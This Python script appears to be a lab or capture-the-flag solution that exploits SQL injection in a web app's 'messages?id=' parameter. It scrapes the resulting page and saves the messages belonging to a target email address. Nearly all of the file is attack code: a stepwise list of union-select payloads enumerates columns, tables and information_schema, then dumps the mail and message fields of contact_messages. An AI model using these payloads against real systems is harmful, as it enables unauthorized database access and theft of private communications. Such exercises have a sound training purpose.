from datarequesting import *
import re

BONDS_EMAIL = 'james@bond.mi5'

author_pattern = re.compile(r'^(?P<author>.*) said :$')

def get_author_names(card_title):
    match = author_pattern.match(card_title)
    return match.group('author') if match else None

def extract_messages(soup):
    def get_only_text(containers):
        return map(lambda c: c.text, containers)

    authors = map(get_author_names,
        get_only_text(soup.findAll("h5", class_="card-title")))
    messages = get_only_text(soup.findAll("blockquote", class_="blockquote"))
    return list(zip(authors, messages))

is_error = lambda s: s.select_one('h1') != None

def get_messages(url):
    soup = get_html_soup(url)
    if is_error(soup):
        return 'There was an error!'
    else:
        messages = extract_messages(soup)
        s = f"""\
Number of messages: {len(messages)}
--------------------"""
        for message in messages:
            s += f'\n{message[0]}:{message[1]}'
            if message[0] == BONDS_EMAIL:
                with open('james_bonds_message.txt', 'w') as f:
                    print(message[1], file=f)
        return s


attack_iterations = [
    "1' --",
    "or id='2'",
    "union select 1,2",
    "union select 1,2,3",
    "union select 1,2,3,4", # author is 2nd column, message is 4th column
    "union select 1,2,3,4 from information_schema.tables where 1=1",
    "union select 1,table_name,3,4 from information_schema.tables where 1=1", # table: contact_messages
    "union select 1,column_name,3,4 from information_schema.columns where table_name='contact_messages'", # id, name, mail, message
    "union select 1,mail,3,message from contact_messages where 1=1",
    f"union select 1,mail,3,message from contact_messages where mail='{BONDS_EMAIL}'",
]
attack_prefix = "'"
attack_sufix = " and '1' = '1"
url = f'{DOMAIN}/messages?id={attack_prefix}{attack_iterations[-1]}{attack_sufix}'
response = get_messages(url)
print(response)
